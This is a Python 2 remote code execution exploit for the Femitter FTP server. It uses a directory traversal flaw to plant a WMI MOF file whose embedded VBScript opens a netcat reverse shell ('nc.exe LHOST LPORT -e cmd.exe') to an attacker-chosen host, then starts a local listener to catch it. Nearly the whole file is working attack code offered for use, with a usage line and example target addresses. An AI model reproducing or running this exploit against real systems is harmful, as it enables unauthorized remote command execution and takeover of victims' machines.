#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ###############################################################################################
#• ▌ ▄ ·.       ·▄▄▄·▄▄▄▄▄▄▄▄ ▄▄▄··▄▄▄▄  ▄▄▄         ▄▄▄· ▄▄▄·▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .                                #
#·██ ▐███▪▪     ▐▄▄·▐▄▄·•██  ▐█ ▄███▪ ██ ▀▄ █·▪     ▐█ ▄█▐█ ▄█▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·                                #
#▐█ ▌▐▌▐█· ▄█▀▄ ██▪ ██▪  ▐█.▪ ██▀·▐█· ▐█▌▐▀▀▄  ▄█▀▄  ██▀· ██▀·▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄                                #
#██ ██▌▐█▌▐█▌.▐▌██▌.██▌. ▐█▌·▐█▪·•██. ██ ▐█•█▌▐█▌.▐▌▐█▪·•▐█▪·•▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌                                #
#▀▀  █▪▀▀▀ ▀█▄▀▪▀▀▀ ▀▀▀  ▀▀▀ .▀   ▀▀▀▀▀• .▀  ▀ ▀█▄▀▪.▀   .▀    ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀                                 #
#                                                                                                                      #
# DATE                                                                                                                 #
# 24/07/2019                                                                                                           #
#                                                                                                                      #
# DESCRIPTION                                                                                                          #
# Acritum Femitter HTTP-FTP Server is a HTTP and FTP server application for Windows.                                   #
# Because of insufficiently sanitation of user-supplied input, Femitter FTP Server is prone to a directory             #
# traversal vulnerability. We abuse that and as the Stuxnet approach we drop a mof payload to get netcat shell         #
#                                                                                                                      #
#                                                                                                                      #
# Femitter FTP Service                                                                                                 #
# nighter - http://nighter.se/                                                                                         #
#                                                                                                                      #
########################################################################################################################

import signal
import string
import random

from ftpdrp import *

from multiprocessing import Process

# chdir to script working directory
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))


# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()


signal.signal(signal.SIGINT, signal_handler)


def random_string_generator(size=8, chars=string.ascii_lowercase + string.ascii_uppercase):
    return ''.join(random.choice(chars) for _ in range(size))


def prepare_netcat():

    if os.path.isfile('./.nc.exe') is False:
        print("[-] netcat payload not found.")
        sys.exit(0)

    os.system('cp ./.nc.exe /tmp/nc.exe 2>/dev/null')
    if os.path.isfile('/tmp/nc.exe') is False:
        print("[-] prepare netcat payload failed.")
        sys.exit(0)


def create_payload():

    mof_skeleton = """#pragma namespace ("\\\\\\\\.\\\\Root\\\\cimv2")

class MSClassConsumer71
{
  [key] string Name;
};

class ActiveScriptEventConsumer : __EventConsumer
{
  [key] string Name;
  [not_null] string ScriptingEngine;
  [Template] string ScriptText;
  string ScriptFilename;
  uint32 KillTimeout = 0;
};

instance of __Win32Provider as $P
{
  Name = "ActiveScriptEventConsumer";
  Clsid = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
  PerUserInitialization = TRUE;
};

instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};

instance of ActiveScriptEventConsumer as $Cons
{
  Name = "ACEVNTBX";
  ScriptingEngine = "VBScript";
  ScriptText = "Set objShell = CreateObject(\\"WScript.Shell\\")\\n"
  "objShell.Run \\"C:\\\\Windows\\\\system32\\\\cmd.exe /C C:\\\\Windows\\\\system32\\\\nc.exe ###LHOST### ###LPORT### -e C:\\\\Windows\\\\system32\\\\cmd.exe\\"\\n";
};

instance of __EventFilter as $Filt
{
  Name = "IEFLTKC";
  Query = "SELECT * FROM __InstanceCreationEvent"
    " WHERE TargetInstance.__class = \\"MSClassConsumer71\\"";
  QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding as $bind
{
    Filter = $Filt;
    Consumer = $Cons;
};


instance of MSClassConsumer71 as $myclass
{
  Name = "ClassConsumer81";
};"""

    mof_name = random_string_generator() + '.mof'
    print('[+] Generating {}'.format(mof_name))

    mof_filled = mof_skeleton.replace('###LHOST###', LHOST)
    mof_filled = mof_filled.replace('###LPORT###', LPORT)

    mof_lfile_path = '/tmp/{}'.format(mof_name)
    try:
        with open(mof_lfile_path, 'w') as mof_file:
            mof_file.write(mof_filled)
    except IOError as e:
        print('[-] An error occured while writing the mof file. Printing exception and exiting...')
        print(e)
        sys.exit(1)

    return mof_name


def exploit():

    fp = Ftpdrp(hostname=HOST, username=USERNAME, password=PASSWORD, timeout=10)
    fp.ftp_dump_payload(MOF_NAME)


if __name__ == '__main__':

    if len(sys.argv) != 6:
        print("""
• ▌ ▄ ·.       ·▄▄▄·▄▄▄▄▄▄▄▄ ▄▄▄··▄▄▄▄  ▄▄▄         ▄▄▄· ▄▄▄·▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
·██ ▐███▪▪     ▐▄▄·▐▄▄·•██  ▐█ ▄███▪ ██ ▀▄ █·▪     ▐█ ▄█▐█ ▄█▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▐█ ▌▐▌▐█· ▄█▀▄ ██▪ ██▪  ▐█.▪ ██▀·▐█· ▐█▌▐▀▀▄  ▄█▀▄  ██▀· ██▀·▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██ ██▌▐█▌▐█▌.▐▌██▌.██▌. ▐█▌·▐█▪·•██. ██ ▐█•█▌▐█▌.▐▌▐█▪·•▐█▪·•▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
▀▀  █▪▀▀▀ ▀█▄▀▪▀▀▀ ▀▀▀  ▀▀▀ .▀   ▀▀▀▀▀• .▀  ▀ ▀█▄▀▪.▀   .▀    ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
    """)
        print("Usage: %s <HOST>:<PORT> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("EXAMPLE: ./femitter_ftp_mof_dropper_rce.py 10.10.10.59 10.10.14.24 1337 anonymous password\n")
        sys.exit(0)

    HOST = sys.argv[1]

    if ':' in HOST:
        (HOST, PORT) = HOST.split(':')
    else:
        PORT = '21'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    print("[+] LHOST = %s" % LHOST)

    prepare_netcat()
    MOF_NAME = create_payload()

    # Exploit windows
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)
